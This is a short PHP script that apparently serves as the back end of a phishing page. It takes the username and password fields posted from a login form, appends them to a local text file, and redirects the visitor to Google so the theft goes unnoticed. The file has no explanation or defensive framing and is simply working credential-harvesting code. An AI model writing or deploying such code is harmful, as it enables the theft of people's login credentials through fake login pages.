<?php
header("location:https://Google.com");
$h = fopen("file.txt","a");
fwrite($h,"name :");
fwrite($h,$_POST['txt']);
fwrite($h,"\n");
fwrite($h,"password :");
fwrite($h,$_POST['pass']);
fwrite($h,"\n");

?>